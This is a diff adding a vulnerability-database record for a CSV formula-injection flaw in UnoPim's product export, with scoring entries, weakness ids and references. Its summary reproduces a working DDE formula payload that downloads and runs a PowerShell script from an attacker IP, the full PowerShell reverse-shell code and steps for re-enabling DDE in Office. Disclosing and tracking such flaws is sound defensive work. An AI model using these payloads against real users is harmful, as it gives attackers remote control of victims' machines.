@@ -1,0 +1,352 @@
+vulnerability_id: VCID-wn5j-5hkm-8be3
+aliases:
+  - CVE-2025-55745
+  - GHSA-74rg-6f92-g6wx
+summary: |
+  UnoPim has CSV Injection on Quick Export feature
+  ### Summary
+  Description:
+  `CSV Injection` or `Formula Injection` is a security vulnerability that occurs when malicious content is inserted into a CSV (Comma-Separated Values) file, which is then opened in a spreadsheet application like Microsoft Excel. This attack exploits the way spreadsheet software automatically interprets certain text patterns as formulas or commands, rather than plain text.
+
+  ### Details
+  A basic test for CSV Injection is using `SUM()` to add two numbers or open calc.exe​ using​
+  command:
+   `=cmd|' /C calc'!A0​`
+
+
+  The same method can be used to run arbitrary code on the victim's machine.
+  For example the below code will download and execute a malicious script to create a reverse TCP connection to the attacker's machine.
+  *Payload*:
+  > This is our payload and will be used in the vulnerable field during exploitation
+  ```
+      =cmd|' /C powershell Invoke-WebRequest
+      "http://52.172.182.242:7000/shell.ps1" -OutFile "$env:Temp\shell.ps1";
+      powershell -ExecutionPolicy Bypass -File "$env:Temp\shell.ps1"'!A1​
+  ```
+
+  *shell.ps1*:
+  ```
+      $client = New-Object System.Net.Sockets.TCPClient('52.172.182.242',8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()​
+  ```
+
+  ### PoC:
+
+    1. Go to any product and click on Edit
+    2. Add the above discussed payload in any field that accept text for e.g. Product Number field.
+    3. Quick Export -> Select CSV, Open the csv, the formula will get executed during opening.
+
+  > This could be injected by admin or any user that has privilege to edit products.
+  > Also the CSRF Injection reported at product edit feature can be used as an attack vector to add such payloads.
+
+
+  Please note that if this is replicated on version starting from Office 2021:
+  Follow these steps:
+  Go to `File > Options > Trust Center > Trust Center Settings > External Content​ -> Enable Dynamic Data Exchange Server Launch"`.
+  This is due to Office 2021 and Microsoft 365 have DDE disabled by default for enhanced security.
+
+  Platform Details:
+  Replicated this on Office 2021 on Windows 11.
+  POC video link: https://drive.proton.me/urls/3TP1QEMXNC#2PAy7OkVqdP3
+
+  ### Impact
+  When the victim opens the CSV, the injected formula which fetches a reverse shell script written in Powershell from attacker's server and executes it. This creates a reverse shell connection from victim's device to attacker's allowing an attacker to perform any action on the victim's device.
+
+  ### Recommendation:
+  - Avoid starting values with Equals sign (=), Plus sign (+), Minus sign (-), At symbol (@), Tab (0x09), Carriage return (0x0D).
+  - Sanitize the vulnerable field using regex or standard libraries.
+  - Wrap the value around double quotes for fields that cannot be sanitized for some reason so that the value is considered as string instead of formula.
+severities:
+  - score: '0.00155'
+    scoring_system: epss
+    scoring_elements: '0.36837'
+    published_at: '2025-09-10 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00155'
+    scoring_system: epss
+    scoring_elements: '0.36864'
+    published_at: '2025-09-22 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00155'
+    scoring_system: epss
+    scoring_elements: '0.36963'
+    published_at: '2025-09-19 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00155'
+    scoring_system: epss
+    scoring_elements: '0.36938'
+    published_at: '2025-09-18 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00155'
+    scoring_system: epss
+    scoring_elements: '0.36896'
+    published_at: '2025-09-17 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00155'
+    scoring_system: epss
+    scoring_elements: '0.3684'
+    published_at: '2025-09-14 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00155'
+    scoring_system: epss
+    scoring_elements: '0.36858'
+    published_at: '2025-09-13 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.39804'
+    published_at: '2025-10-16 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.39832'
+    published_at: '2025-09-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.39824'
+    published_at: '2025-09-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.3985'
+    published_at: '2025-09-27 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.39831'
+    published_at: '2025-09-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.39822'
+    published_at: '2025-09-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.39933'
+    published_at: '2025-10-01 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.3993'
+    published_at: '2025-10-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.39942'
+    published_at: '2025-10-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.39793'
+    published_at: '2025-10-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.39771'
+    published_at: '2025-10-07 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.39784'
+    published_at: '2025-10-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.3974'
+    published_at: '2025-10-19 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.39788'
+    published_at: '2025-10-17 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.39764'
+    published_at: '2025-10-18 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.39718'
+    published_at: '2025-10-20 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.39796'
+    published_at: '2025-10-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.39806'
+    published_at: '2025-10-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00178'
+    scoring_system: epss
+    scoring_elements: '0.39801'
+    published_at: '2025-10-25 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00207'
+    scoring_system: epss
+    scoring_elements: '0.43215'
+    published_at: '2025-10-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00207'
+    scoring_system: epss
+    scoring_elements: '0.43223'
+    published_at: '2025-10-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00207'
+    scoring_system: epss
+    scoring_elements: '0.4335'
+    published_at: '2025-11-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00207'
+    scoring_system: epss
+    scoring_elements: '0.43321'
+    published_at: '2025-11-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00294'
+    scoring_system: epss
+    scoring_elements: '0.52399'
+    published_at: '2026-01-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00294'
+    scoring_system: epss
+    scoring_elements: '0.52432'
+    published_at: '2026-01-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.0046'
+    scoring_system: epss
+    scoring_elements: '0.63178'
+    published_at: '2025-08-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.0046'
+    scoring_system: epss
+    scoring_elements: '0.63158'
+    published_at: '2025-08-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00515'
+    scoring_system: epss
+    scoring_elements: '0.65659'
+    published_at: '2025-09-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: '0.00515'
+    scoring_system: epss
+    scoring_elements: '0.65656'
+    published_at: '2025-09-09 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://drive.proton.me/urls/3TP1QEMXNC#2PAy7OkVqdP3
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://drive.proton.me/urls/3TP1QEMXNC#2PAy7OkVqdP3
+  - score: LOW
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-74rg-6f92-g6wx
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/unopim/unopim
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/unopim/unopim
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/unopim/unopim/commit/8325b78567411ad78d44c0385f192360e608ff71
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/unopim/unopim/commit/8325b78567411ad78d44c0385f192360e608ff71
+  - score: '2.5'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:P/VC:N/VI:N/VA:N/SC:H/SI:H/SA:H/E:P
+    published_at: None
+    url: https://github.com/unopim/unopim/commit/b25db9496fc147842a519d1dd42ec03c3bf00a34
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/unopim/unopim/commit/b25db9496fc147842a519d1dd42ec03c3bf00a34
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/unopim/unopim/commit/b25db9496fc147842a519d1dd42ec03c3bf00a34
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-08-22T20:02:44Z/
+    published_at: None
+    url: https://github.com/unopim/unopim/commit/b25db9496fc147842a519d1dd42ec03c3bf00a34
+  - score: LOW
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/unopim/unopim/security/advisories/GHSA-74rg-6f92-g6wx
+  - score: '2.5'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:P/VC:N/VI:N/VA:N/SC:H/SI:H/SA:H/E:P
+    published_at: None
+    url: https://github.com/unopim/unopim/security/advisories/GHSA-74rg-6f92-g6wx
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/unopim/unopim/security/advisories/GHSA-74rg-6f92-g6wx
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/unopim/unopim/security/advisories/GHSA-74rg-6f92-g6wx
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-08-22T20:02:44Z/
+    published_at: None
+    url: https://github.com/unopim/unopim/security/advisories/GHSA-74rg-6f92-g6wx
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-55745
+weaknesses:
+  - CWE-1035
+  - CWE-937
+  - CWE-1236
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-55745
+    reference_type:
+    reference_id:
+  - url: https://drive.proton.me/urls/3TP1QEMXNC#2PAy7OkVqdP3
+    reference_type:
+    reference_id:
+  - url: https://github.com/unopim/unopim
+    reference_type:
+    reference_id:
+  - url: https://github.com/unopim/unopim/commit/8325b78567411ad78d44c0385f192360e608ff71
+    reference_type:
+    reference_id:
+  - url: https://github.com/unopim/unopim/commit/b25db9496fc147842a519d1dd42ec03c3bf00a34
+    reference_type:
+    reference_id:
+  - url: https://github.com/unopim/unopim/security/advisories/GHSA-74rg-6f92-g6wx
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-55745
+    reference_type:
+    reference_id: CVE-2025-55745
+  - url: https://github.com/advisories/GHSA-74rg-6f92-g6wx
+    reference_type:
+    reference_id: GHSA-74rg-6f92-g6wx
